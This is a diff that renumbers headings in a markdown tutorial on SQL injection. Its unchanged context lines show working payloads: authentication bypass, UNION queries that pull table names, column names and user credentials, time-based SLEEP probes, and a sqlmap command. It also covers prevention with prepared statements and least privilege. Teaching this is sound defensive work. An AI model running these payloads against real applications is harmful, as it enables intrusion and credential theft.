@@ -22,7 +22,7 @@ Since `1=1` is always true, the query bypasses authentication, granting access w
 
 ## **2. Types of SQL Injection**  
 
-### **1 Error-Based SQL Injection**  
+### **1) Error-Based SQL Injection**  
 Relies on extracting information from database error messages.  
 
 **Example (MySQL)**:
@@ -31,7 +31,7 @@ Relies on extracting information from database error messages.
 ' UNION SELECT NULL, NULL, @@version --  # Extract database version
 ```
 ---
-### **2 Boolean-Based (Blind) SQL Injection**  
+### **2) Boolean-Based (Blind) SQL Injection**  
 The attacker infers information based on application behavior.  
 
 **Example (Testing for User Existence):**  
@@ -42,7 +42,7 @@ The attacker infers information based on application behavior.
 If the second query causes a different response, the site is vulnerable.
 
 ---
-### **3 Time-Based Blind SQL Injection**  
+### **3) Time-Based Blind SQL Injection**  
 Used when no visible output is returned. The attacker delays the response to confirm injection.  
 
 **Example (MySQL)**:
@@ -50,7 +50,7 @@ Used when no visible output is returned. The attacker delays the response to con
 ' OR IF(1=1, SLEEP(5), 0) --  # Causes a 5-second delay if the query is executed
 ```
 ---
-### **4 Union-Based SQL Injection**  
+### **4) Union-Based SQL Injection**  
 Uses the `UNION` SQL operator to extract data.  
 
 **Example (Extracting Database Name):**  
@@ -58,7 +58,7 @@ Uses the `UNION` SQL operator to extract data.
 ' UNION SELECT database(), NULL, NULL --
 ```
 ---
-### **5 Out-of-Band SQL Injection**  
+### **5) Out-of-Band SQL Injection**  
 Extracts data via external interactions (DNS, HTTP requests).  
 
 **Example (SQL Server – Sending Data to an Attacker's Server):**  
@@ -68,29 +68,29 @@ Extracts data via external interactions (DNS, HTTP requests).
 ---
 
 ## **3. Exploiting SQL Injection**  
-### **1 Finding the Number of Columns**  
+### **1) Finding the Number of Columns**  
 ```sql
 ' ORDER BY 1 --
 ' ORDER BY 2 --
 ' ORDER BY 3 --   # Increase the number until an error occurs
 ```
 ---
-### **2 Extracting Database Version**  
+### **2) Extracting Database Version**  
 ```sql
 ' UNION SELECT @@version, NULL, NULL --
 ```
 ---
-### **3 Extracting Table Names**  
+### **3) Extracting Table Names**  
 ```sql
 ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --
 ```
 ---
-### **4 Extracting Column Names from a Table**  
+### **4) Extracting Column Names from a Table**  
 ```sql
 ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
 ```
 ---
-### **5 Extracting User Credentials**  
+### **5) Extracting User Credentials**  
 ```sql
 ' UNION SELECT username, password FROM users --
 ```
@@ -107,7 +107,7 @@ Extracts data via external interactions (DNS, HTTP requests).
 
 ## **5. Preventing SQL Injection**  
 
-### **1 Use Prepared Statements (Parameterized Queries)**  
+### **1) Use Prepared Statements (Parameterized Queries)**  
 Ensures user input is treated as data, not SQL code.  
 
 **Example (PHP – MySQLi Prepared Statement):**
@@ -123,12 +123,12 @@ cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (user, pas
 ```
 
 ---
-### **2 Input Validation & Whitelisting**  
+### **2) Input Validation & Whitelisting**  
 - Allow only expected input formats (e.g., email, numeric values).  
 - Reject special characters like `'`, `--`, `;`, `"`  
 
 ---
-### **3 Escape Special Characters**  
+### **3) Escape Special Characters**  
 If prepared statements are not available, use escaping.  
 
 **Example (PHP – MySQLi Escape):**
@@ -136,13 +136,13 @@ If prepared statements are not available, use escaping.
 $username = mysqli_real_escape_string($conn, $_GET['username']);
 ```
 ---
-### **4 Use Least Privilege Principle**  
+### **4) Use Least Privilege Principle**  
 - Grant database users minimal privileges.  
 - Avoid using `root` or `admin` accounts in web applications.  
 - Restrict `DROP`, `DELETE`, and `UPDATE` permissions where unnecessary.  
 
 ---
-### **5 Implement Web Application Firewalls (WAFs)**  
+### **5) Implement Web Application Firewalls (WAFs)**  
 Use security tools to block malicious requests.  
 - **ModSecurity**  
 - **Cloudflare WAF**  
@@ -151,12 +151,12 @@ Use security tools to block malicious requests.
 ---
 
 ## **6. SQL Injection Testing Tools**
-### **1 SQLMap (Automated Testing)**
+### **1) SQLMap (Automated Testing)**
 ```bash
 sqlmap -u "http://example.com/login.php?id=1" --dbs
 ```
 ---
-### **2 Burp Suite (Manual Testing)**
+### **2) Burp Suite (Manual Testing)**
 - Intercept and modify requests.  
 - Test SQLi payloads in form fields.  
 
